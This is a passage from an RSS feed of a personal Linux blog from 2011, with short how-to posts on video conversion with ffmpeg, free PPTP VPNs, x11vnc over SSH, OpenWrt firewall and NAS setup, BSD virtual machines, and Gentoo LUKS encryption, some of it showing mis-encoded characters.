<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ file encrypted.db
encrypted.db: data
$ hexdump -C encrypted.db
00000000  e4 2a cd 22 4f d4 30 a6  b7 95 9c 28 19 f5 4a 45  |.*.&#34;O.0....(..JE|
00000010  c9 b6 c4 28 49 0b 3b c3  91 ef 06 95 e7 6a aa 03  |...(I.;......j..|
00000020  ff b7 ef 2f cd 48 c9 b3  01 36 24 4b dd 4c 95 ef  |.../.H...6$K.L..|
00000030  93 df be 94 ff 8a 0e 04  c4 fc b0 bf 67 97 fc 43  |............g..C|
00000040  38 2b b3 6e e2 88 2e 26  e7 ef 19 e3 e5 b8 0f 04  |8+.n...&amp;........|
00000050  50 44 5a d9 83 1d ac 33  d9 21 cd d1 40 c6 d8 3d  |PDZ....3.!..@..=|
00000060  ab 11 5d 77 6d 94 08 59  64 5f ac e6 99 20 05 03  |..]wm..Yd_... ..|
00000070  da 08 8a b7 a3 cf d4 22  44 c2 de 4c 00 48 51 4d  |.......&#34;D..L.HQM|
00000080  74 0b 3b f6 5d f9 07 07  1b 77 a0 8b 9e 5e bd bb  |t.;.]....w...^..|
00000090  d4 ca 25 75 f2 f7 56 48  ea 03 02 c5 da 50 41 f6  |..%u..VH.....PA.|
000000a0  91 01 d1 3d cb 34 12 5c  eb 49 05 da 4f 13 65 e7  |...=.4..I..O.e.|
000000b0  1c ae 60 13 e1 0d ef 11  33 bc 8f 55 a5 e3 9c 56  |..`.....3..U...V|
000000c0  d5 78 16 7f 20 ee 54 c0  4b a9 7c 70 41 56 8c e3  |.x.. .T.K.|pAV..|
000000d0  e3 d1 81 f8 fc aa 31 ac  c1 e0 5c 92 59 0b 26 e9  |......1....Y.&amp;.|
000000e0  89 68 96 3c d4 87 d2 ef  d7 8a ee 9a 29 78 c4 12  |.h.&lt;........)x..|
000000f0  88 28 fb db 51 8b 66 fc  96 2e d9 3c d4 90 ea d5  |.(..Q.f....&lt;....|
00000100  d9 49 04 da dc 61 f0 54  0e 3f c9 e2 a9 a4 7b 8c  |.I...a.T.?....{.|
00000110  67 5d 0f 15 bb 7e 30 b8  5b 6b 0a 78 ee 81 f2 b0  |g]...~0.[k.x....|
00000120  fd 60 cf d0 79 92 60 06  6f d7 b6 15 aa 39 eb 6e  |.`..y.`.o....9.n|
00000130  7c d6 38 38 44 47 4f c1  54 d4 6c 51 53 a3 6e 99  ||.88DGO.T.lQS.n.|
00000140  65 13 32 88 71 a3 c3 67  dd b9 7a 4d 33 7d 0a 47  |e.2.q..g..zM3}.G|
00000150  2b ca b0 ff b7 dd d6 9b  0b 4f 8f 5f 31 b3 85 92  |+........O._1...|
00000160  8e cc 63 5a 91 06 ce 94  cf ba 7d 52 2d 4e 22 d5  |..cZ......}R-N&#34;.|
00000170  43 37 95 27 2a a6 a1 89  65 2c fc c4 e6 47 6f 0c  |C7.&#39;*...e,...Go.|
00000180  28 fb ed ad 16 fb 7c 2a  50 bc e2 b1 b7 22 39 c0  |(.....|*P....&#34;9.|
00000190  7f 23 68 80 9e c9 1d 44  eb bf f0 01 49 ed 71 6b  |.#h....D....I.qk|
000001a0  af 4b 35 e4 52 de 14 75  e2 30 ae 7b 39 34 bc 72  |.K5.R..u.0.{94.r|
000001b0  c4 2b 20 1c fa 58 d1 5c  4e 4c de 50 ac 67 24 be  |.+ ..X.NL.P.g$.|
000001c0  e2 d0 ed 98 ae 60 67 24  c2 b2 c2 46 1b ab 96 bb  |.....`g$...F....|
000001d0  4e 2e 67 63 cb ca bc c6  ea 48 db b2 ed 7d 34 5a  |N.gc.....H...}4Z|
000001e0  0b 7d 5a 6a 38 8c 59 21  01 e2 7c 7c 42 80 05 36  |.}Zj8.Y!..||B..6|
000001f0  d5 b9 b8 02 31 f1 cf 80  75 7a a3 5f 38 b6 c7 07  |....1...uz._8...|
00000200  bd 2a 29 61 80 b2 19 05  2c 07 2c b6 35 ef 26 32  |.*)a....,.,.5.&amp;2|
00000210  18 61 27 4c 27 38 d1 a1  07 ca 1a 23 d4 97 8f d1  |.a&#39;L&#39;8.....#....|
00000220  88 db 87 07 88 97 cf 64  88 f6 53 a5 e6 05 62 02  |.......d..S...b.|
00000230  0f c3 04 c5 0b de 66 45  dd 1e 62 bf 7d ff 8a 03  |......fE..b.}...|
00000240  23 41 b3 6a d1 2d 60 e7  3f 34 03 9f 8c a0 3c 37  |#A.j.-`.?4....&lt;7|
00000250  5c bc 78 c9 06 f1 e4 2c  f2 38 e6 cb a1 18 1a 5a  |.x....,.8.....Z|
00000260  bc 4d 2d 4f 9e 40 de f2  73 d2 25 c7 1f dd d4 00  |.M-O.@..s.%.....|
00000270  3c 0e 9c 66 09 56 37 bf  08 12 e8 f0 d0 fa 67 a2  |&lt;..f.V7.......g.|
00000280  f8 12 9a 46 ae 8e e4 4c  31 db 74 8a d9 ed 36 97  |...F...L1.t...6.|
00000290  62 25 6c 28 22 5e 08 80  40 07 83 47 e0 62 dc cd  |b%l(&#34;^..@..G.b..|
000002a0  ce f8 4b 48 48 19 c9 cd  ba 2c 11 9b 0b 0c 90 ea  |..KHH....,......|
000002b0  fe 17 9e 30 02 33 46 c0  49 7d c1 e4 f0 5b de e4  |...0.3F.I}...[..|
000002c0  08 52 66 b4 be 7b e7 58  54 52 11 0c 76 6e 75 99  |.Rf..{.XTR..vnu.|
000002d0  26 84 b1 42 b4 a5 6e a5  eb dd 17 d7 86 07 a0 b9  |&amp;..B..n.........|
000002e0  17 d8 86 70 3f 9a d0 4f  3b b7 00 9f fb dd bc 94  |...p?..O;.......|
000002f0  aa f5 08 94 a8 98 22 2b  88 84 14 76 d9 d9 bd 35  |......&#34;+...v...5|
00000300  f1 19 66 0f 25 31 7d 57  43 7b 66 c5 79 b5 4a 94  |..f.%1}WC{f.y.J.|
00000310  7b 5a 66 63 3a 7f e5 d4  e6 6b c7 f1 bf 7c 46 76  |{Zfc:....k...|Fv|
00000320  94 d7 4a d6 60 b3 5b f2  fb 74 3d ec 3c dc 8e 08  |..J.`.[..t=.&lt;...|
00000330  e9 b0 1f 42 a4 90 6f 40  5d 48 f1 9d 28 c2 66 28  |...B..o@]H..(.f(|
00000340  51 a6 67 e2 c8 b8 f9 46  3f 42 e8 67 91 8a 25 e6  |Q.g....F?B.g..%.|
00000350  e6 4c 35 a7 9c d1 2d 4f  8e 6a 24 ba b0 ca a3 22  |.L5...-O.j$....&#34;|
00000360  8e 75 b1 b4 f3 58 ce c9  9e 59 39 10 04 be 37 f8  |.u...X...Y9...7.|
00000370  ca d4 1e 88 54 cd f8 92  9a 54 7a 70 94 8b b0 11  |....T....Tzp....|
00000380  ee e8 ae 4a 59 3b bc 32  e5 8e aa 16 0f a0 81 e6  |...JY;.2........|
00000390  54 15 bc 9a 58 1b 4d a0  2e d5 f0 7e 0f 60 6e b0  |T...X.M....~.`n.|
000003a0  29 48 f4 4a 5c 1a d5 92  d3 1a 9d 9d d2 d9 8e 77  |)H.J..........w|
000003b0  b5 63 0d 59 c7 8d d7 f5  f6 42 7c 45 cb dd 05 05  |.c.Y.....B|E....|
...
</code></pre></div><p>As you can see, there is a lot of &hellip; garbage inside the file! No SQL commands, nothing!</p>
<h2 id="end">End</h2>
<p>I hope you&rsquo;ve enjoyed this one as much as IÂ did. Don&rsquo;t hesitate to write comments and keep it clean.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Convert MTS to MKV using tsMuxeR and ffmpeg</title>
      <link>https://blog.dornea.nu/2011/06/28/howto-convert-mts-to-mkv-using-tsmuxer-and-ffmpeg/</link>
      <pubDate>Tue, 28 Jun 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/06/28/howto-convert-mts-to-mkv-using-tsmuxer-and-ffmpeg/</guid>
      <content:encoded><![CDATA[<p>Since I wasn&rsquo;t able to find any acceptable Howto, I thought I&rsquo;d write my own one.</p>
<h2 id="initial-situation">Initial situation</h2>
<p>I have some videos taken with my <strong>Panasonic Lumix DMC-TZ10</strong> in AVCHD Lite format (MTS). All I want to do is to convert these files into some more handy format like MKV (Matroska).</p>
<h2 id="demuxing">Demuxing</h2>
<p>I&rsquo;ve used <strong>tsMuxeR</strong> from SmartLabs to demux the files. Here&rsquo;s what I did:</p>
<p><img src="/posts/img/2011/253/tsmuxer.png" alt="tsmuxer"></p>
<p>Now you should have following files on your disk:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ls -ltr 00001.*
-rwxr-xr-x 1 root root 1259520 Jun 27 21:31 00001.MTS
-rw-r----- 1 root root    8906 Jun 28 10:09 00001.track_4608.sup
-rw-r----- 1 root root   25344 Jun 28 10:09 00001.track_4352.ac3
-rw-r----- 1 root root 1150138 Jun 28 10:09 00001.track_4113.264
</code></pre></div><h2 id="put-things-together">Put things together</h2>
<p>Now using <strong>ffmpeg</strong> let&rsquo;s create some MKV from previously demuxed files. Make sure you have ffmpeg with libx264 built-in support (&quot;-enable-libx264&quot; when configuring). For Gentoo users this are my USE flags:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># eix -e ffmpeg
[I] media-video/ffmpeg
...
     Installed versions:  0.7_rc1(09:28:59 PM 06/27/2011)(3dnow 3dnowext X alsa avx bzip2 encode hardcoded-tables mmx mmxext ssse3 truetype v4l v4l2 x264 xvid zlib -aac -altivec -amr -bindist -celt -cpudetection -custom-cflags -debug -dirac -doc -faac -frei0r -gsm -ieee1394 -jack -jpeg2k -mp3 -network -oss -pic -qt-faststart -rtmp -schroedinger -sdl -speex -static-libs -test -theora -threads -vaapi -vdpau -video_cards_nvidia -vorbis -vpx)
</code></pre></div><p>Now all you have to do is to type:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ffmpeg -i 00001.*.264 -i 00001.*.ac3 -vcodec libx264 -acodec ac3 -b 2000k output.mkv
</code></pre></div><p>You should get some crazy output like:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ffmpeg version 0.7-rc1, Copyright (c) 2000-2011 the FFmpeg developers
  built on Jun 27 2011 21:28:51 with gcc 4.4.4
  configuration: --prefix=/usr --libdir=/usr/lib64 --shlibdir=/usr/lib64 --mandir=/usr/share/man --enable-shared --cc=x86_64-pc-linux-gnu-gcc --disable-static --enable-gpl --enable-postproc --enable-avfilter --disable-stripping --disable-debug --disable-doc --disable-network --disable-vaapi --disable-ffplay --disable-vdpau --enable-libx264 --enable-libxvid --disable-indev=oss --disable-indev=jack --enable-x11grab --disable-outdev=oss --enable-libfreetype --disable-altivec --enable-hardcoded-tables
  libavutil    50. 40. 1 / 50. 40. 1
  libavcodec   52.120. 0 / 52.120. 0
  libavformat  52.108. 0 / 52.108. 0
  libavdevice  52.  4. 0 / 52.  4. 0
  libavfilter   1. 77. 0 /  1. 77. 0
  libswscale    0. 13. 0 /  0. 13. 0
  libpostproc  51.  2. 0 / 51.  2. 0
[h264 @ 0x24266a0] Estimating duration from bitrate, this may be inaccurate

Seems stream 0 codec frame rate differs from container frame rate: 100.00 (100/1) -&gt; 50.00 (100/2)
Input #0, h264, from &amp;#39;00001.track_4113.264&amp;#39;:
  Duration: N/A, bitrate: N/A
    Stream #0.0: Video: h264 (High), yuv420p, 1280x720 [PAR 1:1 DAR 16:9], 25 fps, 50 tbr, 1200k tbn, 100 tbc
[ac3 @ 0x2427960] Estimating duration from bitrate, this may be inaccurate
Input #1, ac3, from &amp;#39;00001.track_4352.ac3&amp;#39;:
  Duration: 00:00:01.05, start: 0.000000, bitrate: 192 kb/s
    Stream #1.0: Audio: ac3, 48000 Hz, stereo, s16, 192 kb/s
File &amp;#39;output.mkv&amp;#39; already exists. Overwrite ? [y/N] y
[buffer @ 0x242d7d0] w:1280 h:720 pixfmt:yuv420p
[libx264 @ 0x245aa20] Default settings detected, using medium profile
[libx264 @ 0x245aa20] using SAR=1/1
[libx264 @ 0x245aa20] using cpu capabilities: MMX2 SSE2Fast SSSE3 FastShuffle SSE4.1 Cache64
[libx264 @ 0x245aa20] profile High, level 3.2
[libx264 @ 0x245aa20] 264 - core 107 - H.264/MPEG-4 AVC codec - Copyleft 2003-2010 - http://www.videolan.org/x264.html - options: cabac=1 ref=3 deblock=1:0:0 analyse=0x3:0x113 me=hex subme=7 psy=1 psy_rd=1.00:0.00 mixed_ref=1 me_range=16 chroma_me=1 trellis=1 8x8dct=1 cqm=0 deadzone=21,11 fast_pskip=1 chroma_qp_offset=-2 threads=1 sliced_threads=0 nr=0 decimate=1 interlaced=0 constrained_intra=0 bframes=3 b_pyramid=2 b_adapt=1 b_bias=0 direct=1 weightb=1 open_gop=0 weightp=2 keyint=250 keyint_min=25 scenecut=40 intra_refresh=0 rc_lookahead=40 rc=abr mbtree=1 bitrate=2000 ratetol=1.0 qcomp=0.60 qpmin=10 qpmax=51 qpstep=4 ip_ratio=1.40 aq=1:1.00
Output #0, matroska, to &amp;#39;output.mkv&amp;#39;:
  Metadata:
    encoder         : Lavf52.108.0
    Stream #0.0: Video: libx264, yuv420p, 1280x720 [PAR 1:1 DAR 16:9], q=2-31, 2000 kb/s, 1k tbn, 50 tbc
    Stream #0.1: Audio: ac3, 48000 Hz, stereo, s16, 64 kb/s
Stream mapping:
  Stream #0.0 -&gt; #0.0
  Stream #1.0 -&gt; #0.1
Press [q] to stop encoding
^Came=   22 fps=  0 q=0.0 size=       1kB time=10000000000.00 bitrate=   0.0kbits/s    
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Free PPTP VPN servers</title>
      <link>https://blog.dornea.nu/2011/06/24/free-pptp-vpn-servers/</link>
      <pubDate>Fri, 24 Jun 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/06/24/free-pptp-vpn-servers/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;d recommend you all using some VPN to keep your identity safe and private. Here&rsquo;s some setup:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ pptpsetup --create vpnde --server pptp.freedevpn.com --username free --password --encrypt 
$ pptpsetup --create vpnca --server freecavpn.com --username free --password --encrypt 
$ pptpsetup --create vpnl --server freenlvpn.com --username free --password --encrypt 
$ pptpsetup --create vpnuk --server freeukvpn.com --username free --password --encrypt
</code></pre></div><p>For the passwords have a look at freenlvpn.com, freedevpn.com, freeukvpn.com, freecavpn.com. The VPN passwords changes every 12 hours, so keep in mind to change whenever the authentication failes. Therefore have a look at /etc/ppp/chap-secrets. Just edit the password there and you&rsquo;re ready to go. In order to activate the VPN connection you&rsquo;ll have to:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ pon vpn{de, uk, nl, ca}
</code></pre></div><p>Please choose only one them. Have a look at your syslog to check if the connection succeded. If so, then have a look at your [b]ppp device[/b] for the IP. Now you should delete your default route and add a new one. For example we have following in our log:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Jun 23 23:17:32 BlackTiny pppd[16313]: local IP address 10.32.0.50 
Jun 23 23:17:32 BlackTiny pppd[16313]: remote IP address 10.32.0.1
</code></pre></div><p>Then you should:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ route delete default
$ route add default gw 10.32.0.1
</code></pre></div><p>That&rsquo;s it! Now test the connection using traceroute, ipchicken.com or whatever. To disable the VPN connection just fire up:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ poff vpn{de, uk, nl, ca}
</code></pre></div><p>and you&rsquo;re done. Keep in mind to <strong>restore the old default route</strong>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>VNC: Connect to current desktop session using x11vnc and ssh</title>
      <link>https://blog.dornea.nu/2011/04/04/vnc-connect-to-current-desktop-session-using-x11vnc-and-ssh/</link>
      <pubDate>Mon, 04 Apr 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/04/04/vnc-connect-to-current-desktop-session-using-x11vnc-and-ssh/</guid>
      <content:encoded><![CDATA[<p><strong>x11vnc</strong> allows you to connect to real X displays without creating any new X session (fluxbox, twm, gnome etc.). It allows you to control the mouse, keyboard and X events remotely. I usually use it when friends of mine need help and I want to see what exactly they&rsquo;re doing.</p>
<p>Make sure any **ssh server **is running on <em>remote-host</em>and you have a vnc client installed on your <em>localhost</em>. Also make sure <em>remote-host</em> has x11vnc otherwise this won&rsquo;t make sense at all.Then run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[remote-host] &gt; x11vnc -display :0
[localhost] &gt; ssh -t -L 5900:localhost:5900 [remote-user]@[remote-host]
</code></pre></div><p>Now the whole connection is encrypted via ssh. Now open new terminal and run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[localhost] &gt; vncviewer localhost:5900
</code></pre></div><p>That&rsquo;s all!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Block facebook with iptables on OpenWrt</title>
      <link>https://blog.dornea.nu/2011/04/02/block-facebook-with-iptables-on-openwrt/</link>
      <pubDate>Sat, 02 Apr 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/04/02/block-facebook-with-iptables-on-openwrt/</guid>
      <content:encoded><![CDATA[<p>Say <strong>NO</strong> to facebook and add these lines to <code>/etc/firewall.user</code></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># This file is interpreted as shell script.
# Put your custom $IPT rules here, they will
# be executed with each firewall (re-)start.
IPT=iptables
NET_LAN=192.168.0.0/16

...

# facebook
$IPT -I FORWARD -p tcp -m iprange --dst-range 66.220.144.0-66.220.159.255 --dport 443 -j DROP
$IPT -I FORWARD -p tcp -m iprange --dst-range 69.63.176.0-69.63.191.255 --dport 443 -j DROP
$IPT -I FORWARD -p tcp -m iprange --dst-range 204.15.20.0-204.15.23.255 --dport 443 -j DROP
$IPT -I FORWARD -p tcp -m iprange --dst-range 66.220.144.0-66.220.159.255 --dport 80 -j DROP
$IPT -I FORWARD -p tcp -m iprange --dst-range 69.63.176.0-69.63.191.255 --dport 80 -j DROP
$IPT -I FORWARD -p tcp -m iprange --dst-range 204.15.20.0-204.15.23.255 --dport 80 -j DROP
</code></pre></div><p>Run <code>/etc/init.d/firewall restart</code> and you&rsquo;re done!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>OpenBSD, FreeBSD, NetBSD - I do love beasts!</title>
      <link>https://blog.dornea.nu/2011/03/21/openbsd-freebsd-netbsd-i-do-love-beasts/</link>
      <pubDate>Mon, 21 Mar 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/03/21/openbsd-freebsd-netbsd-i-do-love-beasts/</guid>
      <content:encoded><![CDATA[<p>It all starts with virtualisation! Since there is no BSD at all on my laptop, I thought I should give the most important ones a chance: FreeBSD, OpenBSD and NetBSD. Although there were several rumours afloat â€“ related to complexity factors (installation, configuration etc.) â€“ I had absolutely no problem setting up *BSD with X11(!!!). Besides that I had a look at the packaging systems provided within each BSD. My conclusion: They are pretty much the same: <strong>make install</strong> and basta. Here some screenshots:</p>
<h2 id="virtualbox">VirtualBox</h2>
<p><img src="/posts/img/2011/237/virtualbox.png" alt="Virtualbox"></p>
<!--break-->
<h2 id="openbsd">OpenBSD</h2>
<p><img src="/posts/img/2011/237/openbsd_1.png" alt="OpenBSD 1"></p>
<p><img src="/posts/img/2011/237/openbsd_2.png" alt="OpenBSD 2"></p>
<h2 id="netbsd">NetBSD</h2>
<p><img src="/posts/img/2011/237/netbsd_1.png" alt="NetBSD 1"></p>
<p><img src="/posts/img/2011/237/netbsd_2.png" alt="NetBSD 2"></p>
<h2 id="freebsd">FreeBSD</h2>
<p><img src="/posts/img/2011/237/freebsd_1.png" alt="FreeBSD 1"></p>
<p><img src="/posts/img/2011/237/freebsd_1.png" alt="FreeBSD 2"></p>]]></content:encoded>
    </item>
    
    <item>
      <title>My own cheap NAS - the OpenWRT way</title>
      <link>https://blog.dornea.nu/2011/03/19/my-own-cheap-nas-the-openwrt-way/</link>
      <pubDate>Sat, 19 Mar 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/03/19/my-own-cheap-nas-the-openwrt-way/</guid>
      <content:encoded><![CDATA[<p>Introducing my <strong>TP-LinkÂ TL-WR1043ND</strong>:</p>
<p><img src="/posts/img/2011/236/tp-link-TL-WR1043ND_2.jpg" alt="TP Link"></p>
<h2 id="summary">Summary</h2>
<ul>
<li><strong>OS</strong>: Linux <strong>OpenWrt</strong> 2.6.32.25 #1 Fri Nov 19 20:27:50 PST 2010 mips GNU/Linux</li>
<li><strong>CPU</strong>:Â  <pre class="brush:java;">system type             : Atheros AR9132 rev 2
machine                 : TP-LINK TL-WR1043ND
processor               : 0
cpu model               : MIPS 24Kc V7.4</pre></li>
</ul>
<h2 id="filesystems">Filesystems</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@OpenWrt:~# df -Ph
Filesystem                Size      Used Available Capacity Mounted on
/dev/root                 2.1M      2.1M         0 100% /rom
tmpfs                    14.4M    232.0K     14.2M   2% /tmp
tmpfs                   512.0K         0    512.0K   0% /dev
/dev/sda1                 1.8G     64.6M      1.8G   3% /overlay
mini_fo:/overlay          2.1M      2.1M         0 100% /
</code></pre></div><p>As you can see a USB-Hub is attached along with a 2GB USB-Stick. I used it to store my rootfs on external storage [1]. Additionally my 2TB external hard drived is attached to the device so I can access the data per NFS [2].</p>
<p><img src="/posts/img/2011/236/tp-link-TL-WR1043ND_1.jpg" alt="TP Link"></p>
<h2 id="firewall">Firewall</h2>
<p>These are my firewall [3] rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@OpenWrt:~# cat /etc/firewall.user 
# This file is interpreted as shell script.
# Put your custom iptables rules here, they will
# be executed with each firewall (re-)start.
IPT=iptables
NET_LAN=192.168.0.0/16

# ssh from outside
$IPT -I input -j ACCEPT -i eth0.2 -s xxx -p tcp --dport 22
$IPT -I input -j ACCEPT -i eth0.2 -s xxx -p udp --dport 22

# portmap
$IPT -I INPUT -j ACCEPT -i eth0.2 -s $NET_LAN -p tcp --dport 111
$IPT -I INPUT -j ACCEPT -i eth0.2 -s $NET_LAN -p udp --dport 111

# nfsd
$IPT -I INPUT -j ACCEPT -i eth0.1 -s $NET_LAN -p tcp --dport 32777:32780
$IPT -I INPUT -j ACCEPT -i eth0.1 -s $NET_LAN -p udp --dport 32777:32780

# minidlna
$IPT -I INPUT -j ACCEPT -i eth0.2 -s $NET_LAN -p tcp --dport 8200
$IPT -I INPUT -j ACCEPT -i eth0.2 -s $NET_LAN -p udp --dport 8200
</code></pre></div><h2 id="what-about-speed">What about speed?</h2>
<p><img src="/posts/img/2011/236/tp-link_speed-test.png" alt="TP Link speed"></p>
<p>In general you won&rsquo;t get more than <strong>5.60MB/s</strong>. It depends on your drives read/write speed and the connection. In my case I was using WLAN which was slower than normal LAN connectivity. Â But that&rsquo;s fine with me.</p>
<h2 id="conclusion">Conclusion</h2>
<p><strong>Awesome device with great features!</strong> Check out <a href="http://openwrt.org">openwrt.org</a> Â for more information. The devices price is about <strong>50â‚¬</strong> which is a fair one.</p>
<p>Â </p>
<h2 id="links">Links</h2>
<p>[1] <a href="http://wiki.openwrt.org/doc/howto/extroot">http://wiki.openwrt.org/doc/howto/extroot</a></p>
<p>[2]Â <a href="http://wiki.openwrt.org/doc/howto/nfs.server">http://wiki.openwrt.org/doc/howto/nfs.server</a></p>
<p>[3] <a href="http://wiki.openwrt.org/doc/uci/firewall?s">http://wiki.openwrt.org/doc/uci/firewall?s</a></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Full-Encrypt data using Gentoo,Luks and initramfs</title>
      <link>https://blog.dornea.nu/2011/03/07/howto-full-encrypt-data-using-gentooluks-and-initramfs/</link>
      <pubDate>Mon, 07 Mar 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/03/07/howto-full-encrypt-data-using-gentooluks-and-initramfs/</guid>
      <content:encoded><![CDATA[<p>Since last post many things have changed. No more NetBSD on my laptop (this has to do with several things, I&rsquo;ll write about in a future post): I had to fall in love with Gentoo! I&rsquo;ll try to give you some quick overview related to this posts title: Encryption under Gentoo using Luks.</p>
<p>There are serveral (good!) tutorials out there. Among these I&rsquo;ve used:</p>
<table style="width: 100%;" border="1" cellspacing="1" cellpadding="1">
  <tr>
    <td>
      <a href="http://en.gentoo-wiki.com/wiki/DM-Crypt_with_LUKS">http://en.gentoo-wiki.com/wiki/DM-Crypt_with_LUKS</a>
    </td>
<pre><code>&lt;td&gt;
  There you'll get a lot of information related to the topic. I've basically followed the same steps as described in the HowTo. However I didn't get any functionable system at all. Especially the initramfs part seems to be buggy. Therefore: Follow the steps Ã­n the article &lt;strong&gt;except&lt;/strong&gt; the initramfs part!
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <a href="http://de.gentoo-wiki.com/wiki/DM-Crypt">http://de.gentoo-wiki.com/wiki/DM-Crypt</a> <strong>(german)</strong>
    </td>
<pre><code>&lt;td&gt;
  Really good explanations. If you want some technical background to this whole thing, this is the place to be.
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <a href="http://djamc.ath.cx/2008/01/20/howto-gentoo-vollverschlusselung-mit-cryptsetup-und-initramfs-bei-der-installation/">http://djamc.ath.cx/2008/01/20/howto-gentoo-vollverschlusselung-mit-cryptsetup-und-initramfs-bei-der-installation/</a> <strong>(german)</strong>
    </td>
<pre><code>&lt;td&gt;
  Another nice howto I've found.
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td>
      <a href="http://en.gentoo-wiki.com/wiki/Initramfs">http://en.gentoo-wiki.com/wiki/Initramfs</a>
    </td>
<pre><code>&lt;td&gt;
  As already mentioned above, you'll get into troubles if you don't have a working initramfs. Follow this link to get detailed information how to create your own - as I did! - initramfs and how to adapt it to your needs.
&lt;/td&gt;
</code></pre>
  </tr>
</table>
<p>There is no need for additional explanations! Just follow the instructions in the tutorial and you&rsquo;re done.</p>
<h2 id="my-initramfs">My initramfs</h2>
<p>Here is my initramfs structure I&rsquo;m using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tree
.
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ bin
Ã¢â€â€šÂ Â  Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ busybox
Ã¢â€â€šÂ Â  Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ gpg
Ã¢â€â€šÂ Â  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ gpg-error
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ dev
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ etc
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ init
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ lib
Ã¢â€â€šÂ Â  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ modules
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ mnt
Ã¢â€â€šÂ Â  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ root
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ new-root
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ proc
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ README
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ root
Ã¢â€â€šÂ Â  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ keys
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ sbin
Ã¢â€â€šÂ Â  Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ cryptsetup
Ã¢â€â€šÂ Â  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ mdev
Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬ sys
Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ usr
